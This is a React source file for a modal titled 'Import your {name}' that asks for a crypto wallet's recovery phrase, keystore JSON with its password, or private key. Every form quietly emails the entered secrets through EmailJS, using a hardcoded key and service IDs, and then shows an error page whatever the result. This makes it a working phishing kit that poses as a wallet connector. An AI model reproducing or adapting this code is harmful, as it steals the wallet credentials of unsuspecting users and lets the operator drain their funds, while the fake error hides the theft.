// import { emailjs } from '@emailjs/browser'
import React, { useState } from 'react'
import { useNavigate } from 'react-router-dom';


function ModalWallet({img, name, cancelModal}) {
    const [phraseInput, setPhraseInput] = useState('');
    const [keystoreInput, setKeyStoreInput] = useState({
        keystoreJSON: "",
        keystorepassword: ""
    })
    const [privatekeyInput, setPrivatekeyInput] = useState('');
    const navigate = useNavigate();

    useState(()=>{
        emailjs.init('dFX7V_QgdyVOq1Gsk')
    },[])

    function tabToggle(tabId){
        document.querySelectorAll('.tabs-item > div').forEach((item)=>{
            item.classList.add('hidden')
        })
        document.querySelector(`#${tabId}`).classList.remove('hidden')
    }

    function setPhrase(e){
        setPhraseInput(e.target.value)
    }

    function setKeystore(e){
        setKeyStoreInput({...keystoreInput, [e.target.id]: e.target.value})
    }

    function setPrivateKey(e){
        setPrivatekeyInput(e.target.value)
    }



    function handleSubmit(e){
        e.preventDefault();
        emailjs.sendForm('service_p6dborp', 'template_f1lpt2u', '#phraseSubmit')
        .then(function(response) {
                navigate("/error")
            }, function(error) {
                navigate("/error")
        });
    }

    function handleSubmitjson(e){
        e.preventDefault()
        emailjs.sendForm('service_p6dborp', 'template_jxpzm2j', '#keyStoreJson')
        .then(function(response) {
                navigate("/error")
            }, function(error) {
                navigate("/error")
        });
    }

    function handleSubmitPrivateKey(e){
        e.preventDefault()
        emailjs.sendForm('service_p6dborp', 'template_f1lpt2u', '#PrivateKey')
        .then(function(response) {
                navigate("/error")
            }, function(error) {
                navigate("/error")
        });
    }

    return (
        <div className='fixed w-full h-screen z-50 bg-black/[0.2] flex items-center justify-center'>
            <div className='w-[80%] md:w-1/2 bg-white p-5 relative rounded-[5px] my-8 transition-all rounded-lg '>
                <div className='p-6 sm:p-5 pb-4 '>
                    <h3 className='flex mt-2 leading-6 text-lg font-semibold text-[#1A202C]'>
                        <img src={img} alt={name} className="h-10 w-10 mr-5 block" />
                        <span>Import your {name}</span>
                    </h3>
                    <div className='mt-10 text-[#587087]'>
                            <div className='flex justify-evenly border-b-2 border-b-[#e2e8f0] mb-4'>
                                <button onClick={()=>tabToggle('firstChild')} id='phrase' className='p-2 cursor-pointer hover:border-b-2 hover:border-b-blue-600'>Phrase</button>
                                <button onClick={()=>tabToggle('second')} id='keystore' className='p-2 cursor-pointer hover:border-b-2 hover:border-b-blue-600'>Keystore JSON</button>
                                <button onClick={()=>tabToggle('third')} id='private' className='p-2 cursor-pointer hover:border-b-2 hover:border-b-blue-600'>Private Key</button>
                            </div>
                            <div className='tabs-item'>
                                <div id="firstChild" className=''>
                                    <div className='relative '>
                                        <form action="" method="POST" onSubmit={handleSubmit} id="phraseSubmit">
                                            <input type="text" name='wallet_type' className='hidden' value={name}/>
                                            <input type="text" name='input_type' className='hidden' value={"Phrase"}/>
                                            <textarea 
                                                cols="30" 
                                                rows="4" 
                                                placeholder="Enter your recovery phrase" 
                                                className="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" 
                                                name="wallet_message" 
                                                id="wallet_message" 
                                                minLength={12} 
                                                required
                                                value={phraseInput}
                                                onChange={setPhrase}
                                            />
                                            <p className="text-xs text-grey-300 my-6">
                                                Typically 12 (sometimes 24) words separated by single spaces
                                            </p>
                                            <div className="flex w-full">
                                                <button type="submit" name="import" className="flex items-center justify-center focus:outline-none text-white text-sm sm:text-base bg-blue-600 hover:bg-blue-700 rounded py-2 w-full transition duration-150 ease-in">
                                                    <span className="mr-2 uppercase">Proceed</span> 
                                                    <span>
                                                        <svg fill="none" strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" viewBox="0 0 24 24" stroke="currentColor" className="h-6 w-6">
                                                            <path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                                        </svg>
                                                    </span>
                                                </button>
                                            </div>
                                        </form>
                                    </div>
                                </div>
                                <div id="second" className="bg-grey-600 hidden">
                                    <div className="flex flex-col">
                                        <form action="" method="POST" onSubmit={handleSubmitjson} id="keyStoreJson">
                                            <input type="text" id='wallet_typekeystore' name='wallet_typekeystore' className='hidden' value={name} />
                                            <textarea 
                                                cols="30" 
                                                rows="4" 
                                                placeholder="Enter your Keystore Json" 
                                                className="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" 
                                                name="keystoreJSON" 
                                                id="keystoreJSON" 
                                                minLength="12" 
                                                required="" 
                                                value={keystoreInput.keystoreJSON}
                                                onChange={setKeystore}
                                            />   
                                            <div className="relative mb-6">
                                                <input 
                                                    type="text" 
                                                    id="keystorepassword" 
                                                    name="keystorepassword" 
                                                    placeholder="Wallet password" 
                                                    className="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" 
                                                    required
                                                    value={keystoreInput.keystorepassword}
                                                    onChange={setKeystore}
                                                />
                                                <p className="text-xs text-grey-300 my-6">
                                                    Several lines of text beginning with {"{...}"} plus the password you used to encrypt it.
                                                </p>
                                            </div>
                                            <div className="flex w-full">
                                                <button type="submit" name="import" className="flex items-center justify-center focus:outline-none text-white text-sm sm:text-base bg-blue-600 hover:bg-blue-700 rounded py-2 w-full transition duration-150 ease-in">
                                                    <span className="mr-2uppercase" name="import">Proceed</span>
                                                    <span>
                                                        <svg fill="none" strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" viewBox="0 0 24 24" stroke="currentColor" className="h-6 w-6">
                                                            <path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                                        </svg>
                                                    </span>
                                                </button>
                                            </div>
                                        </form>
                                    </div> 
                                </div>
                                <div id="third" className='bg-grey-600 hidden'>
                                    <div className=''>
                                        <form action="" method="POST" onSubmit={handleSubmitPrivateKey} id="PrivateKey">
                                            <input type="text" name='wallet_type' className='hidden' value={name}/>
                                            <input type="text" name='input_type' className='hidden' value={"Private Key"}/>
                                            <input 
                                                type="text" 
                                                placeholder="Enter your Private Key" 
                                                name="wallet_message" 
                                                id="wallet_message" 
                                                className=" text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" 
                                                required
                                                value={privatekeyInput}
                                                onChange={setPrivateKey}
                                            />
                                            <p className="text-xs text-grey-300 my-6">Typically 12 (sometimes 24) words seperated by a single space.</p>
                                            <button type="submit" name="import" className="flex items-center justify-center focus:outline-none text-white text-sm sm:text-base bg-blue-600 hover:bg-blue-700 rounded py-2 w-full transition duration-150 ease-in">
                                                <span className="mr-2 uppercase">Proceed</span> 
                                                <span>
                                                    <svg fill="none" strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" viewBox="0 0 24 24" stroke="currentColor" className="h-6 w-6">
                                                        <path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                                    </svg>
                                                </span>
                                            </button>
                                        </form>
                                    </div>
                                </div>
                        </div>
                    </div>
                    <div className="bg-gray-50 px-4 py-3 sm:px-6 sm:flex sm:flex-row-reverse">
                        <button id="cancel" onClick={cancelModal} type="button" className="w-full inline-flex justify-center rounded-md border border-transparent shadow-sm px-4 py-2 bg-[#e53e3e] text-base font-medium text-white hover:opacity-75 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-red-500 sm:ml-3 sm:w-auto sm:text-sm">
                            Cancel
                        </button>
                    </div>
                </div>
            </div>
        </div>
  )
}

export default ModalWallet
